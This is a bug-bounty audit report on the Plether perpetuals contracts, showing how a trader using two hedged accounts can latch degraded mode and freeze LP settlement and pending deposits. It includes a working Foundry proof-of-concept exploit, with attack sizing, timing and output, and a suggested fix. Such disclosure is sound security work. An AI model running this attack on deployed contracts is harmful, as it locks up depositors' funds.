# \#98346 [SC-High] Any trader can latch degraded mode with a hedged book and freeze all LP epoch settlement and pending deposits until the owner pays the shortfall

**Submitted on Nov 7th 2026 at 06:18:26 UTC by @Tekmer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98346
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro
Opening a position is admitted only while pool assets net of trader claims (E) cover the larger side's aggregate maximum profit (L)
plus a 25 bps buffer. Closing has no such gate: a winning close is paid from cash net of claims, and afterwards the engine latches
`degradedMode` when E < L. Only the owner can clear the latch, and only once E >= L again. While it holds, `settleLpEpoch` reverts, so
no deposit activates and no redemption is funded, and matured pending deposits cannot be cancelled.

An unprivileged trader with two accounts builds a balanced long/short book at the admission limit, waits for an ordinary basket move
(about 0.85% or more; 1.2% in the PoC), closes the winning leg and keeps the losing leg open. E drops below L, the latch sets, and it
stays set for as long as the trader keeps the leg open (carry about 1.4k USDG/day on a 10M book). The latch also survives the
trader's exit: settlement keeps reverting until the owner calls `clearDegradedMode`.

## Vulnerability Details
1. **Closes are not gated on solvency.** The close planner pays the price gain whenever free cash net of claims covers it
   (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L953-L968),
   with no check against the remaining liability. Opens require `E >= L + B`
   (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L771-L777).
2. **The latch.** After every close and liquidation, `_enterDegradedModeIfInsolvent` sets `degradedMode = true` when cash net of claims
   is below `_maxLiability()`
   (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1351-L1369;
   called at L1320 and L1344).
3. **Only the owner clears it, and only after recovery.** `clearDegradedMode` is `onlyOwner` and reverts `CfdEngine__StillInsolvent`
   while cash net of claims is below the liability
   (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L658-L667).
   `recapitalizePool` (L632) adds cash but does not clear the latch. Nothing unprivileged lowers L while the losing leg stays open.
4. **LP settlement stops.** `settleLpEpoch` calls `_requireWithdrawalsLive`, which reverts `HousePool__DegradedMode`
   (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L832
   and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1864-L1868).
   Redemption funding, deposit activation and the senior coupon checkpoint all run inside that call, so none happens.
5. **Pending deposits are locked, not refunded.** `cancelPendingDeposit` reverts once the request epoch has started unless the
   request is rejected, a terminal wipe is projected, senior is impaired, or (senior only) settlement is on hold
   (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L851-L860).
   Degraded mode is none of these, so a matured junior deposit is stuck, and senior deposits are stuck unless the owner or pauser
   places an LP settlement hold, which releases senior cancellations but not junior ones.
6. **Victim set.** Junior deposits requested in the hour before the latch (the attacker latches just before the hourly boundary), all
   pending senior deposits, and all redemption requests in started epochs. New deposit requests revert while degraded, so the victims
   are the LPs already committed when the latch sets.
7. **Traders with live positions are also frozen.** Free-collateral withdrawal reverts `CfdEngine__DegradedMode` while latched
   (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L274-L276).

## Impact Details
PoC numbers at release parameters (manifest economics: maint 10 / init 20 / fad 300 bps, exec fee 4 bps, buffer 25 bps, VPI 0.01,
carry 500 bps; pool 2M junior + 8M senior at the 80% senior cap):
- Book: 10,019,800 tokens on each side (E0 10,050,007 USDG, L0 10,019,800), sized after the last hourly settlement. After a 1.2% move and the winning close: E 9,982,567 < L 10,019,800, latch set.
- A third party's 100,000 USDG junior deposit, requested inside the attack hour (keepers settled every hourly epoch before it, so no
  older deposit was waiting): not activated and not cancellable at all eight 6-hourly checks over 48 h; the depositor holds none of it.
- LP settlement reverted `HousePool__DegradedMode` at every attempt; no redemption funded, no coupon checkpoint.
- The latch outlives the attack: after the trader unwinds, settlement still reverts until `clearDegradedMode`.
- Attacker net cost 71,927 USDG (fees, VPI, about 50 h carry); no profit. Owner's cure while the leg is open: 37,232 USDG of new
  junior capital injected and assigned (the owner receives junior shares for it).
- Control test: the same book without the move-and-close step settles and activates the deposit, so the latch causes the freeze.

Feasibility: the attacker needs two accounts, about 600k USDG of margin per side, and a basket move of at least 0.85% in either
direction (ordinary over a day for the listed FX basket). Under the program's rules these are feasibility limits that reduce the
payout, not the severity. The project documents the latch as deliberate containment (SECURITY.md "Degraded containment",
ACCOUNTING_SPEC.md principle 7); that text is not in the program's known-issue list, and the list's degraded-mode mention
(Cecuro LOW-22) covers only that recapitalization does not clear the latch, not that an unprivileged trader can set it at will and
freeze third-party deposits for an attacker-chosen time.

Why this is not the documented containment: the trigger is deliberate and riskless for the attacker (the book is hedged, so no
price risk is contained), the pool is economically solvent when the latch fires (the open losing leg owes the pool about 119k USDG and
is fully margined; the latch compares cash against a contingent maximum profit), and the frozen deposits would add capital and carry no
risk. The documentation describes the latch as a response to insolvency, not as a lever any trader can pull against committed LPs.

Suggested fix: do not latch on a close that only returns the book to its pre-open solvency (compare against the liability after the
close, as `getMaxLiabilityAfterClose` already computes for the withdrawal firewall), or let the latch block risk expansion and
redemption funding without blocking deposit activation and cancellation; and give `cancelPendingDeposit` a degraded-mode exit.

## References
- CfdEngine.sol L1351-L1369 (latch), L1320 / L1344 (callers), L658-L667 (`clearDegradedMode`), L632 (`recapitalizePool`)
- HousePool.sol L832 and L1864-L1868 (settlement revert)
- TrancheVault.sol L851-L860 (cancel conditions)
- CfdEnginePlanLib.sol L771-L777 (open admission), L953-L968 (close payout)
- CfdEngineSettlementSidecar.sol L274-L276 (withdrawal revert)
- Known-issue check: SECURITY.md Known Limitations (L1328-1457), L687-700 and L701-713 do not mention degraded mode; Cecuro LOW-22
  (recapitalization does not clear the latch) is a different impact; the scan and pre-audit only name the revert.

## Proof of Concept

Foundry test on the repository's `BasePerpTest` at release parameters. Save as `packages/perps/test/poc/HedgedCloseFreezesLpDeposits.t.sol`
and run from `packages/perps`:

```bash
FOUNDRY_TEST=test/poc forge test --offline --skip script --match-path 'test/poc/HedgedCloseFreezesLpDeposits.t.sol' -vv
```

Expected: 4 tests pass.
- `test_ClosingWinnerOfHedgedBookFreezesInFlightJuniorDeposit48h`: keepers settle every hourly epoch up to the attack; the victim
  requests 100k junior inside the attack hour; the attacker closes the winner after a 1.2% move just before the boundary; the latch
  sets (E 9,982,567 < L 10,019,800); `clearDegradedMode` reverts `CfdEngine__StillInsolvent`; eight settlement attempts over 48 h
  revert `HousePool__DegradedMode`; the victim can neither cancel nor activate; the latch survives the attacker's unwind; settlement
  resumes only after the owner clears. Attacker net cost 71,927 USDG.
- `test_RecapitalizeAndClearAloneLeavesDepositActivationBlocked`: the documented runbook (`recapitalizePool` 37,232 then
  `clearDegradedMode`) leaves settlement reverting `HousePool__NoLpEpochProgress`, also after the attacker unwinds.
- `test_FullOwnerCureEndsFreezeAndReturnsJuniorShares`: adding `assignUnassignedAssets` ends the freeze 60 minutes after the victim's
  epoch start; the owner receives junior shares worth the 37,232 USDG injected.
- `test_control_SameTimelineWithoutCloseActivatesDeposit`: same book, no close: settlement runs and the deposit activates.

Key output:
```
book size each leg (tokens) 10019800 10019800
E0, L0 (USDG) 10050007 10019800
after close: E, L (USDG) 9982567 10019800
shortfall at the latch (USDG) 37232
victim USDG frozen 100000
hours frozen since the victim's epoch start 48
attacker net cost after unwinding (USDG) 71927
minutes frozen since the victim's epoch start 60   (full owner cure)
```

<details><summary>HedgedCloseFreezesLpDeposits.t.sol</summary>

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// An unprivileged trader with two accounts builds a balanced LONG/SHORT book at the open-admission limit (E >= L + B)
// through the Router and an unprivileged keeper, at release risk parameters. Keepers settle every hourly LP epoch up to
// the attack, so no matured deposit is waiting. A third party requests a Junior deposit inside the hour of the attack.
// After an ordinary basket move the trader closes the winning leg just before the hourly boundary. The Engine latches
// degraded mode (E < L) while the losing leg stays open. From the boundary on, the victim's deposit can neither be
// cancelled nor activated, and every LP epoch settlement reverts. The latch survives the trader's unwind and only the
// owner can lift it. The owner's recapitalize-and-clear runbook alone leaves deposit activation blocked; the full cure
// also assigns the injected cash to the owner as Junior shares. The control runs the same timeline without the close.

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console2} from "forge-std/console2.sol";

contract HedgedCloseFreezesLpDepositsTest is BasePerpTest {

    address internal juniorLp = address(0x1A11);
    address internal seniorLp = address(0xA11CE);
    address internal earlierLp = address(0xE411);
    address internal victimLp = address(0xB0B);
    address internal traderLong = address(0xBAD1);
    address internal traderShort = address(0xBAD2);
    address internal keeper = address(0x4EE9);

    uint256 internal constant JUNIOR_ASSETS = 2_000_000e6;
    uint256 internal constant SENIOR_ASSETS = 8_000_000e6;
    uint256 internal constant TRADER_FUNDS = 600_000e6;
    uint256 internal constant EARLIER_DEPOSIT = 50_000e6;
    uint256 internal constant VICTIM_DEPOSIT = 100_000e6;
    // Monday 2024-03-11 00:30 UTC (Sunday 20:30 New York, after the FX open and outside FAD).
    uint256 internal constant START = 1_710_117_000;
    uint256 internal constant HOUR_1 = START + 30 minutes; // 01:00 UTC epoch boundary
    uint256 internal constant HOUR_2 = HOUR_1 + 1 hours; // 02:00 UTC epoch boundary
    uint256 internal constant MOVE_BPS = 120;
    uint256 internal constant HOLD_STEPS = 8; // 8 x 6 h = 48 h

    bytes4 internal constant DEGRADED_SEL = bytes4(keccak256("HousePool__DegradedMode()"));
    bytes4 internal constant NO_PROGRESS_SEL = bytes4(keccak256("HousePool__NoLpEpochProgress()"));

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig);
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.minOpenNotionalAssets = 1000e6;
        routerConfig.adverseConfidenceMultiplierBps = 2500;
        routerAdmin.proposeRouterConfig(routerConfig);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        routerAdmin.finalizeRouterConfig();

        _fundJunior(juniorLp, JUNIOR_ASSETS);
        _fundSenior(seniorLp, SENIOR_ASSETS);
        _fundTrader(traderLong, TRADER_FUNDS);
        _fundTrader(traderShort, TRADER_FUNDS);
        if (block.timestamp < START) {
            vm.warp(START);
        }
    }

    // ---------------------------------------------------------------- helpers

    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp();
    }

    function _pyth(
        uint256 price
    ) internal returns (bytes[] memory data) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(_now() + 1);
        baseMockPyth.setAllPrices(_basePythFeedIds(), SafeCast.toInt64(SafeCast.toInt256(price)), 0, int32(-8), _now());
        data = new bytes[](1);
        data[0] = abi.encode(price);
    }

    function _refresh(
        uint256 price
    ) internal {
        bytes[] memory data = _pyth(price);
        vm.prank(keeper);
        router.updateMarkPrice(data);
    }

    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        _refresh(price);
        vm.prank(account);
        uint64 id = router.commitOrder(side, size, margin, 0, isClose);
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(keeper);
        router.executeOrder(id, data);
        assertEq(router.nextExecuteId(), 0, "order executed");
    }

    function _E() internal view returns (uint256) {
        uint256 p = pool.totalAssets();
        uint256 c = engine.totalTraderClaimBalanceAssets();
        return p > c ? p - c : 0;
    }

    function _shortfall() internal view returns (uint256) {
        uint256 e = _E();
        uint256 l = _maxLiability();
        return l > e ? l - e : 0;
    }

    /// Permissionless keeper settlement through the Router with a fresh Pyth update at the current mark.
    function _settle() internal returns (bool ok, bytes4 sel) {
        bytes[] memory data = _pyth(engine.lastMarkPrice());
        vm.prank(keeper);
        bytes memory ret;
        (ok, ret) = address(router).call(abi.encodeWithSelector(router.settleLpEpoch.selector, data));
        if (!ok && ret.length >= 4) {
            sel = bytes4(ret);
        }
    }

    function _requestJuniorDeposit(
        address lp,
        uint256 amount
    ) internal returns (uint256 requestId) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        requestId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
    }

    function _canCancel(
        address lp,
        uint256 requestId
    ) internal returns (bool ok) {
        uint256 snap = vm.snapshotState();
        vm.prank(lp);
        (ok,) = address(juniorVault).call(abi.encodeWithSignature("cancelPendingDeposit(uint256)", requestId));
        vm.revertToStateAndDelete(snap);
    }

    function _traderBalances() internal view returns (uint256) {
        return clearinghouse.balanceAssets(traderLong) + clearinghouse.balanceAssets(traderShort);
    }

    function _buildBalancedBook() internal returns (uint256 longSize, uint256 shortSize) {
        uint256 q = CfdTypes.SIZE_QUANTUM;
        uint256 step = 3_500_000e18;
        uint256 marginPerStep = 25_000e6;
        _trade(traderShort, CfdTypes.Side.SHORT, step, marginPerStep, false, 1e8);
        _trade(traderLong, CfdTypes.Side.LONG, 2 * step, 2 * marginPerStep, false, 1e8);
        _trade(traderShort, CfdTypes.Side.SHORT, step, marginPerStep, false, 1e8);
        uint256 target = (_E() * 9970 / 10_000) / 1e6 * 1e18; // tokens at price 1.0
        target = target / q * q;
        (longSize,,,,,,) = engine.positions(traderLong);
        if (target > longSize) {
            uint256 add = target - longSize;
            _trade(traderLong, CfdTypes.Side.LONG, add, marginPerStep, false, 1e8);
            _trade(traderShort, CfdTypes.Side.SHORT, add, marginPerStep, false, 1e8);
        }
        (longSize,,,,,,) = engine.positions(traderLong);
        (shortSize,,,,,,) = engine.positions(traderShort);
    }

    /// Shared timeline up to just before the 02:00 boundary. Keepers settle the 01:00 epoch (activating an earlier
    /// depositor), the victim requests inside the 01:00-02:00 hour, and, when `closeWinner`, the trader closes the
    /// winning LONG at 01:58 after a 1.2% basket move.
    function _timeline(
        bool closeWinner
    ) internal returns (uint256 victimRequest, uint256 shortSize, uint256 traderStart) {
        traderStart = _traderBalances();
        uint256 earlierRequest = _requestJuniorDeposit(earlierLp, EARLIER_DEPOSIT);
        // Hourly keeper settlement: the 01:00 epoch is settled promptly and the earlier deposit activates.
        vm.warp(HOUR_1 + 30);
        _refresh(1e8);
        (bool ok,) = _settle();
        assertTrue(ok, "hourly keeper settlement runs before the attack");
        assertEq(juniorVault.claimableDepositRequest(earlierRequest, earlierLp), EARLIER_DEPOSIT, "earlier deposit activated");

        // The trader sizes the hedged book to the admission limit of the pool as it now stands.
        uint256 longSize;
        (longSize, shortSize) = _buildBalancedBook();
        console2.log("book size each leg (tokens)", longSize / 1e18, shortSize / 1e18);
        console2.log("E0, L0 (USDG)", _E() / 1e6, _maxLiability() / 1e6);

        // Victim requests inside the attack hour; its epoch starts at 02:00.
        // Deposit requests need a fresh mark; any keeper's routine permissionless mark update supplies it.
        vm.warp(HOUR_1 + 30 minutes);
        _refresh(1e8);
        victimRequest = _requestJuniorDeposit(victimLp, VICTIM_DEPOSIT);
        assertEq(juniorVault.depositEpochStart(victimRequest), HOUR_2, "victim deposit activates at 02:00");

        // The losing leg is topped up from the trader's own free settlement so it stays above maintenance.
        vm.prank(traderShort);
        engine.addMargin(traderShort, 250_000e6);

        vm.warp(HOUR_2 - 2 minutes);
        if (closeWinner) {
            _trade(traderLong, CfdTypes.Side.LONG, longSize, 0, true, 1e8 - MOVE_BPS * 1e4);
            assertTrue(engine.degradedMode(), "closing the winner latches degraded mode");
            assertLt(_E(), _maxLiability(), "pool assets net of claims below max liability");
            console2.log("after close: E, L (USDG)", _E() / 1e6, _maxLiability() / 1e6);
            console2.log("shortfall at the latch (USDG)", _shortfall() / 1e6);
        }
        assertLt(_now(), HOUR_2, "still before the victim's epoch boundary");
    }

    // ---------------------------------------------------------------- tests

    function test_ClosingWinnerOfHedgedBookFreezesInFlightJuniorDeposit48h() public {
        (uint256 victimRequest, uint256 shortSize, uint256 traderStart) = _timeline(true);
        uint256 p1 = 1e8 - MOVE_BPS * 1e4;
        uint256 latchTime = _now();

        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();

        // New deposit requests are refused while degraded, so no further depositors are caught.
        settlementToken.mint(address(0xD00D), 1000e6);
        vm.startPrank(address(0xD00D));
        settlementToken.approve(address(juniorVault), 1000e6);
        (bool newReqOk,) = address(juniorVault).call(
            abi.encodeWithSignature("requestDeposit(uint256,address,address)", 1000e6, address(0xD00D), address(0xD00D))
        );
        vm.stopPrank();
        assertFalse(newReqOk, "new junior requests refused while degraded");

        vm.warp(HOUR_2 + 1);
        assertGe(juniorVault.currentLpEpoch(), victimRequest, "victim epoch started");
        assertFalse(_canCancel(victimLp, victimRequest), "started junior deposit cannot be cancelled");

        for (uint256 i = 0; i < HOLD_STEPS; ++i) {
            vm.warp(_now() + 6 hours);
            _refresh(p1);
            (bool ok, bytes4 sel) = _settle();
            assertFalse(ok, "LP settlement reverts while degraded");
            assertEq(sel, DEGRADED_SEL, "reverts on the degraded latch");
            assertFalse(_canCancel(victimLp, victimRequest), "victim cannot cancel");
            assertEq(juniorVault.claimableDepositRequest(victimRequest, victimLp), 0, "victim deposit not activated");
            assertTrue(engine.degradedMode());
            assertFalse(engineLens.isLiquidatableAt(traderShort, p1, pool.totalAssets()), "losing leg solvent");
        }
        uint256 frozenFor = _now() - HOUR_2;
        assertGe(frozenFor, 48 hours);
        assertEq(settlementToken.balanceOf(victimLp), 0, "victim holds none of its deposit");
        console2.log("victim USDG frozen", VICTIM_DEPOSIT / 1e6);
        console2.log("hours frozen since the victim's epoch start", frozenFor / 1 hours);
        console2.log("hours since the latch", (_now() - latchTime) / 1 hours);
        console2.log("shortfall the owner must inject to clear while the leg is open (USDG)", _shortfall() / 1e6);

        // The trader unwinds; the latch still holds until the owner acts.
        _trade(traderShort, CfdTypes.Side.SHORT, shortSize, 0, true, p1);
        console2.log("attacker net cost after unwinding (USDG)", (traderStart - _traderBalances()) / 1e6);
        assertTrue(engine.degradedMode(), "latch does not clear by itself");
        (bool stillFrozen, bytes4 sel2) = _settle();
        assertFalse(stillFrozen, "settlement still reverts until the owner clears");
        assertEq(sel2, DEGRADED_SEL);
        engine.clearDegradedMode();
        (bool settled,) = _settle();
        assertTrue(settled, "LP settlement resumes after the owner clears");
        assertEq(juniorVault.claimableDepositRequest(victimRequest, victimLp), VICTIM_DEPOSIT, "deposit activates");
    }

    function test_RecapitalizeAndClearAloneLeavesDepositActivationBlocked() public {
        (uint256 victimRequest, uint256 shortSize,) = _timeline(true);
        uint256 p1 = 1e8 - MOVE_BPS * 1e4;
        uint256 s = _shortfall();

        vm.warp(HOUR_2 + 1 hours);
        _refresh(p1);
        settlementToken.mint(address(this), s);
        settlementToken.approve(address(engine), s);
        engine.recapitalizePool(s);
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "latch cleared");
        assertEq(pool.pendingRecapitalizationAssets(), s, "injected cash queued with no claimant path");
        console2.log("owner recapitalization (USDG)", s / 1e6);

        (bool ok, bytes4 sel) = _settle();
        assertFalse(ok, "settlement still makes no progress");
        assertEq(sel, NO_PROGRESS_SEL, "reverts NoLpEpochProgress: deposit activation blocked by unassigned assets");
        assertFalse(_canCancel(victimLp, victimRequest), "victim still cannot cancel");

        // Even after the trader unwinds, the runbook state keeps deposit activation blocked.
        _trade(traderShort, CfdTypes.Side.SHORT, shortSize, 0, true, p1);
        vm.warp(_now() + 6 hours);
        _refresh(p1);
        (ok, sel) = _settle();
        assertFalse(ok);
        assertEq(sel, NO_PROGRESS_SEL);
        assertEq(juniorVault.claimableDepositRequest(victimRequest, victimLp), 0, "victim deposit still not activated");
        console2.log("hours frozen since the victim's epoch start", (_now() - HOUR_2) / 1 hours);
    }

    function test_FullOwnerCureEndsFreezeAndReturnsJuniorShares() public {
        (uint256 victimRequest,,) = _timeline(true);
        uint256 p1 = 1e8 - MOVE_BPS * 1e4;
        uint256 latchTime = _now();
        uint256 s = _shortfall();

        vm.warp(HOUR_2 + 1 hours);
        _refresh(p1);
        settlementToken.mint(address(this), s);
        settlementToken.approve(address(engine), s);
        engine.recapitalizePool(s);
        engine.clearDegradedMode();
        uint256 sharesBefore = juniorVault.balanceOf(address(this));
        _refresh(p1);
        pool.assignUnassignedAssets(false, address(this));
        uint256 minted = juniorVault.balanceOf(address(this)) - sharesBefore;
        uint256 mintedWorth = juniorVault.convertToAssets(minted);
        assertApproxEqAbs(mintedWorth, s, 1e6, "owner's junior shares are worth the injected cash");

        (bool ok,) = _settle();
        assertTrue(ok, "settlement resumes");
        assertEq(juniorVault.claimableDepositRequest(victimRequest, victimLp), VICTIM_DEPOSIT, "victim deposit activates");
        console2.log("owner injected (USDG)", s / 1e6);
        console2.log("owner junior shares received, worth (USDG)", minted, mintedWorth / 1e6);
        console2.log("minutes frozen since the victim's epoch start", (_now() - HOUR_2) / 1 minutes);
        console2.log("minutes since the latch", (_now() - latchTime) / 1 minutes);
    }

    function test_control_SameTimelineWithoutCloseActivatesDeposit() public {
        (uint256 victimRequest,,) = _timeline(false);
        assertFalse(engine.degradedMode());
        vm.warp(HOUR_2 + 30);
        (bool ok,) = _settle();
        assertTrue(ok, "settlement runs without the latch");
        assertEq(juniorVault.claimableDepositRequest(victimRequest, victimLp), VICTIM_DEPOSIT, "deposit activates");
    }

}
```

</details>
